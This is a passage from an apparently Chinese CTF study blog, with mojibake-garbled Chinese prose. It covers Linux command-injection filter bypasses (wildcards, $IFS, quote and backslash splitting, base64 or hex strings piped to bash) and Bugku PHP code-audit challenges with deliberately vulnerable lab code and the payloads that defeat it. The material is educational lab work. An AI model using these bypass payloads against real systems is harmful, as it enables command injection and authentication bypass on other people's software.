class="line">    pool.submit(create_and_remove, i)</span><br><span class="line"></span><br><span class="line">pool.shutdown(<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></div>
<p>ç§»é™¤å®Œæ‰€æœ‰æ•Œäººåï¼Œå°±å¯ä»¥æ‹¿åˆ°flagå•¦</p>
<hr>
<h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>çœ‹ç€å‰é¢æ’åæ— æ•°ç†Ÿæ‚‰çš„å¤§ä½¬ï¼Œè‡ªå·±ä¸èƒ½åªåˆ’æ°´ä¸åŠªåŠ›å•Šï¼Œæœ€è¿‘è¿˜æ˜¯è¦åšæŒå»èŠ±äº›æ—¶é—´çœ‹çœ‹ä¹¦ï¼Œåšåšé¢˜ï¼Œä¹Ÿç»™è‡ªå·±ç«‹ä¸ªflagï¼Œäº”ä¸€å‰å»æŠŠæµé‡åˆ†æå¥½å¥½å­¦ä¸€å­¦</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>å‘½ä»¤æ³¨å…¥ç»•è¿‡å§¿åŠ¿</title>
    <url>/yakko117/2019/04/07/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒæ–‡ç« å¦‚ä¸‹<br><a href="https://www.smi1e.top/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">å¾®ç¬‘å¸ˆå‚…</a><br><a href="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw" target="_blank" rel="noopener">Zeddå¸ˆå‚…</a></p>
<h1 id="Linuxé€šé…ç¬¦"><a href="#Linuxé€šé…ç¬¦" class="headerlink" title="Linuxé€šé…ç¬¦"></a>Linuxé€šé…ç¬¦</h1><p><code>?</code> : åŒ¹é…ä»»ä½•ä¸€ä¸ªå­—ç¬¦</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat fl??</span><br><span class="line">flag&#123;manayakko_test&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>*</code> : åŒ¹é…ä»»ä½•å­—ç¬¦ä¸²/æ–‡æœ¬ï¼ŒåŒ…æ‹¬ç©ºå­—ç¬¦ä¸²</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat fl**</span><br><span class="line">flag&#123;manayakko_test&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>[ ]</code> : åŒ¹é…èŒƒå›´ä¸­ä»»ä½•ä¸€ä¸ªå­—ç¬¦<br><code>[a-z]</code> ï¼šåŒ¹é…a-zèŒƒå›´ä¸­ä»»ä½•ä¸€ä¸ªå­—ç¬¦</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat fl[abc]g</span><br><span class="line">flag&#123;manayakko_test&#125;</span><br><span class="line"></span><br><span class="line">$ cat fl[a-z]g</span><br><span class="line">flag&#123;manayakko_test&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>{a,b,c}</code> : å¯¹ä»¥é€—å·åˆ†éš”çš„æ–‡ä»¶åˆ—è¡¨è¿›è¡Œæ‹“å±•</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat fl&#123;a,b,c&#125;g</span><br><span class="line">flag&#123;manayakko_test&#125;</span><br><span class="line">cat: flbg: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">cat: flcg: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line"></span><br><span class="line">$ &#123;cat,flag,flbg&#125;</span><br><span class="line">flag&#123;manayakko_test&#125;</span><br><span class="line">cat: flbg: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br></pre></td></tr></table></figure></div>

<p><code>{ }</code> ä¸ <code>[ ]</code> æœ‰æ¯”è¾ƒå¤§çš„åŒºåˆ«ã€‚å½“åŒ¹é…çš„æ–‡ä»¶ä¸å­˜åœ¨æ—¶ï¼Œ<code>[ ]</code> ä¼šå¤±å»æ¨¡å¼åŠŸèƒ½ï¼Œå˜æˆä¸€ä¸ªå•çº¯çš„å­—ç¬¦ä¸²ï¼Œè€Œ <code>{ }</code> ä¾ç„¶å¯ä»¥å±•å¼€ï¼› è¿™é‡Œæˆ‘æ–°å»ºä¸€ä¸ª<code>a.txt</code>ï¼› </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls [ab].txt</span><br><span class="line">a.txt</span><br><span class="line"></span><br><span class="line">$ ls [bc].txt</span><br><span class="line">ls: æ— æ³•è®¿é—®&#39;[bc].txt&#39;: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line"></span><br><span class="line">$ ls &#123;a,b&#125;.txt</span><br><span class="line">ls: æ— æ³•è®¿é—®&#39;b.txt&#39;: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">a.txt</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="å‘½ä»¤åˆ†éš”ä¸æ‰§è¡Œå¤šæ¡å‘½ä»¤"><a href="#å‘½ä»¤åˆ†éš”ä¸æ‰§è¡Œå¤šæ¡å‘½ä»¤" class="headerlink" title="å‘½ä»¤åˆ†éš”ä¸æ‰§è¡Œå¤šæ¡å‘½ä»¤"></a>å‘½ä»¤åˆ†éš”ä¸æ‰§è¡Œå¤šæ¡å‘½ä»¤</h1><h2 id="Unix"><a href="#Unix" class="headerlink" title="Unix"></a>Unix</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0a</span><br><span class="line">%0d</span><br><span class="line">;</span><br><span class="line">&amp;</span><br><span class="line">|</span><br><span class="line">$(shell_command)&#96;shell_command&#96;&#123;shell_command,&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%0a</span><br><span class="line">&amp;</span><br><span class="line">|</span><br><span class="line">%1a - ä¸€ä¸ªç¥å¥‡çš„è§’è‰²ï¼Œä½œä¸º.batæ–‡ä»¶ä¸­çš„å‘½ä»¤åˆ†éš”ç¬¦</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h1><h3 id="ä½¿ç”¨-lt-æˆ–-gt"><a href="#ä½¿ç”¨-lt-æˆ–-gt" class="headerlink" title="ä½¿ç”¨ &lt; æˆ– &gt;"></a>ä½¿ç”¨ <code>&lt;</code> æˆ– <code>&gt;</code></h3><p><code>cmd &lt;&gt; file</code> ä»¥è¯»å†™æ¨¡å¼å°†æ–‡ä»¶ <code>file</code> é‡æ–°å®šå‘åˆ°è¾“å‡ºï¼Œæ–‡ä»¶ <code>file</code> ä¸ä¼šè¢«ç ´åã€‚åªæœ‰å½“åº”ç”¨ç¨‹åºåˆ©ç”¨è¿™ä¸€ç‰¹æ€§æ—¶ï¼Œå®ƒæ‰æœ‰æ„ä¹‰ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat&lt;flag</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br><span class="line"></span><br><span class="line">$ cat&lt;&gt;flag # éœ€è¦ææƒ</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="IFS"><a href="#IFS" class="headerlink" title="$IFS"></a>$IFS</h3><p><code>IFS</code> æ˜¯ä¸€ç§setå˜é‡ï¼Œ å½“shellå¤„ç†<strong>â€˜å‘½ä»¤æ›¿æ¢â€™</strong>å’Œ<strong>â€˜å‚æ•°æ›¿æ¢â€™</strong>ï¼Œshellæ ¹æ®IFSçš„å€¼ï¼Œé»˜è®¤æ˜¯ <code>spaceï¼Œ tabï¼Œ newline</code> æ¥æ‹†è§£è¯»å…¥çš„å˜é‡ï¼Œ ç„¶åå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œå¤„ç†ï¼Œ æœ€åé‡æ–°ç»„åˆèµ‹å€¼ç»™å˜é‡ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat$IFS.&#x2F;flag</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="URLç¼–ç "><a href="#URLç¼–ç " class="headerlink" title="URLç¼–ç "></a>URLç¼–ç </h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%20</span><br><span class="line">+</span><br><span class="line">%09(tab)</span><br><span class="line">%3c(&lt;)</span><br></pre></td></tr></table></figure></div>

<h3 id="å˜é‡æ§åˆ¶"><a href="#å˜é‡æ§åˆ¶" class="headerlink" title="å˜é‡æ§åˆ¶"></a>å˜é‡æ§åˆ¶</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ x&#x3D;$&#39;cat\x20.&#x2F;flag&#39;&amp;&amp;$x</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br><span class="line"></span><br><span class="line">$ x&#x3D;$&#39;cat\x09.&#x2F;flag&#39;&amp;&amp;$x</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a>é»‘åå•ç»•è¿‡</h1><h3 id="ç©ºå˜é‡"><a href="#ç©ºå˜é‡" class="headerlink" title="ç©ºå˜é‡"></a>ç©ºå˜é‡</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ca$@t .&#x2F;flag</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br><span class="line"></span><br><span class="line">$ ca$1t .&#x2F;fl$1ag</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="å˜é‡æ›¿æ¢"><a href="#å˜é‡æ›¿æ¢" class="headerlink" title="å˜é‡æ›¿æ¢"></a>å˜é‡æ›¿æ¢</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ a&#x3D;c; b&#x3D;at; c&#x3D;flag; $a$b $c</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ echo &quot;Y2F0IC4vZmxhZw&#x3D;&#x3D;&quot;|base64 -d|bash</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br><span class="line"></span><br><span class="line">$ echo &quot;636174202e2f666c6167&quot; | xxd -r -p|bash  #hex</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br><span class="line"></span><br><span class="line">$ $(printf &quot;\x63\x61\x74\x20\x2e\x2f\x66\x6c\x61\x67&quot;)</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="å¼•å·"><a href="#å¼•å·" class="headerlink" title="å¼•å·"></a>å¼•å·</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ c&quot;a&quot;t .&#39;&#x2F;f&#39;l&#39;a&#39;g&#39;</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="åæ–œæ "><a href="#åæ–œæ " class="headerlink" title="åæ–œæ "></a>åæ–œæ </h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ c\at fl\ag</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="åˆ©ç”¨å·²æœ‰èµ„æºä¸å­—ç¬¦-æœ€åä¸€éƒ¨åˆ†æ²¡æ€ä¹ˆææ‡‚"><a href="#åˆ©ç”¨å·²æœ‰èµ„æºä¸å­—ç¬¦-æœ€åä¸€éƒ¨åˆ†æ²¡æ€ä¹ˆææ‡‚" class="headerlink" title="åˆ©ç”¨å·²æœ‰èµ„æºä¸å­—ç¬¦(æœ€åä¸€éƒ¨åˆ†æ²¡æ€ä¹ˆææ‡‚)"></a>åˆ©ç”¨å·²æœ‰èµ„æºä¸å­—ç¬¦(æœ€åä¸€éƒ¨åˆ†æ²¡æ€ä¹ˆææ‡‚)</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ echo $PATH</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line">$ echo $PATH|cut -c 1</span><br><span class="line">&#x2F;</span><br><span class="line">$ cat .&#96;echo $PATH|cut -c 1&#96;flag</span><br><span class="line">flag&#123;yakko_kawaii&#125;</span><br><span class="line"></span><br><span class="line"># ä»¥ä¸‹æ²¡æ€ä¹ˆææ‡‚ æˆ‘è¿˜è¦æµ‹ä¸€ä¸‹</span><br><span class="line">$&#123;PS2&#125; å¯¹åº”å­—ç¬¦ &gt;</span><br><span class="line">$&#123;PS4&#125; å¯¹åº”å­—ç¬¦ + </span><br><span class="line">$&#123;IFS&#125; å¯¹åº” å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦ </span><br><span class="line">$&#123;9&#125; å¯¹åº” ç©ºå­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>çæ‰¯</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugkuå¹å¤´å‘ writeupï¼ˆæ…¢æ…¢æ›´ï¼‰</title>
    <url>/yakko117/2019/04/05/Bugkuctf/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h1><p>æ¯”è¾ƒç®€å•çš„æŠŠä¸€äº›å¸¸è§æ¼æ´ä½œä¸ºé¢˜ç›®å‡ºäº†å‡ºæ¥</p>
<h2 id="extractå˜é‡è¦†ç›–"><a href="#extractå˜é‡è¦†ç›–" class="headerlink" title="extractå˜é‡è¦†ç›–"></a>extractå˜é‡è¦†ç›–</h2><p><a href="http://www.runoob.com/php/func-array-extract.html" target="_blank" rel="noopener">extract()å‡½æ•°è§£é‡Š</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">'xxx'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))</span><br><span class="line">&#123;</span><br><span class="line">$content=trim(file_get_contents($flag));</span><br><span class="line"><span class="keyword">if</span>($shiyan==$content)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'flag&#123;xxx&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>æ ¹æ®ä»¥ä¸Šä»£ç ï¼Œè¦æ±‚<code>$shiyan==content</code> æ‰èƒ½å¾—åˆ°flagï¼Œæ„é€ Payloadï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.php?shiyan&#x3D;&amp;content&#x3D;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"><a href="#strcmpæ¯”è¾ƒå­—ç¬¦ä¸²" class="headerlink" title="strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"></a>strcmpæ¯”è¾ƒå­—ç¬¦ä¸²</h2><p>è¿™ä¸ªæˆ‘ä»¥å‰åœ¨phpå¼±ç±»å‹æ—¶å†™è¿‡å¦‚ä½•å»ç»•è¿‡</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/6.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag&#123;xxxxx&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (strcmp($_GET[<span class="string">'a'</span>], $flag) == <span class="number">0</span>) <span class="comment">//å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1å¤§äº str2è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚</span></span><br><span class="line"><span class="comment">//æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'No'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><code>if (strcmp($_GET[&#39;a&#39;], $flag) == 0)</code> </p>
<p>å¦‚æœ <code>str1</code> å°äº <code>str2</code> è¿”å› &lt;0ï¼› å¦‚æœ <code>str1</code> å¤§äº <code>str2</code>è¿”å› &gt;0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å›0ã€‚<br>æ‰€ä»¥å¿…é¡»è®©ä»–ä»¬ä¸¤ä¸ªç›¸ç­‰æ‰å¯ä»¥ï¼Œç”¨æ•°ç»„è¿›è¡Œç»•è¿‡ï¼Œæ„é€ Payloadï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6.php?a[]&#x3D;1</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"><a href="#urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡" class="headerlink" title="urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"></a>urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/10.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"not allowed!"</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Access granted!"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>é¦–å…ˆåˆ†æä»£ç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) <span class="comment">//ä¸èƒ½è®©ä»–åŒ¹é…æˆåŠŸ</span></span><br><span class="line"><span class="comment">//å…¶æ¬¡ è¿›è¡Œäº†urldecodeè§£ç ï¼Œè§£ç åä¸ºhackerDJ</span></span><br><span class="line">_GET[id] = urldecode(_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</span><br></pre></td></tr></table></figure></div>
<p><code>$get</code> è¿›è¡Œä¼ å‚çš„æ—¶å€™ä¸€èˆ¬éƒ½è¿›è¡Œäº†ä¸€æ¬¡è§£ç ï¼Œä¸‹é¢åˆè¿›è¡Œäº†ä¸€æ¬¡è§£ç ã€‚<br>æœ¬é¢˜ç›®ä¹Ÿæç¤ºäº†ä¸ºä¸ºäºŒæ¬¡è§£ç <br>æ‰€ä»¥æˆ‘ä»¬å°† <code>hackerDJ</code> ä¸­çš„ä¸€ä¸ªå­—æ¯è¿›è¡ŒäºŒæ¬¡ç¼–ç å³å¯<br><code>h</code> â€“&gt; <code>%68</code><br><code>%</code> â€“&gt; <code>%25</code><br><code>hackerDJ</code> â€“&gt; <code>%2568ackerDJ</code><br>æ‰€ä»¥æ„é€ Payloadï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.php?id&#x3D;%2568ackerDJ</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="md5-å‡½æ•°"><a href="#md5-å‡½æ•°" class="headerlink" title="md5()å‡½æ•°"></a>md5()å‡½æ•°</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/18.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Your password can not be your username.'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>å…³é”®å¥å¦‚ä¸‹ï¼Œè¦æ±‚ <code>username</code> ä¸èƒ½ç­‰äº <code>password</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ($_GET[&#39;username&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])</span><br></pre></td></tr></table></figure></div>
<p>åˆå› ä¸ºæ˜¯å…¨ç­‰(ä¸‰ä¸ªç­‰å·)ï¼Œæ— æ³•åˆ©ç”¨å¼±ç±»å‹æ¼æ´<br>æ„é€  <code>0e</code> å¼€å¤´çš„å­—ç¬¦ä¸²</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (md5($_GET[&#39;username&#39;]) &#x3D;&#x3D;&#x3D; md5($_GET[&#39;password&#39;]))</span><br></pre></td></tr></table></figure></div>
<p>æ‰€ä»¥ç›´æ¥æ„é€ æ•°ç»„ç»•è¿‡,Payloadå¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">18.php?username[]&#x3D;QNKCDZO&amp;password[]&#x3D;240610708</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="æ•°ç»„è¿”å›NULLç»•è¿‡"><a href="#æ•°ç»„è¿”å›NULLç»•è¿‡" class="headerlink" title="æ•°ç»„è¿”å›NULLç»•è¿‡"></a>æ•°ç»„è¿”å›NULLç»•è¿‡</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/19.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You password must be alphanumeric'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
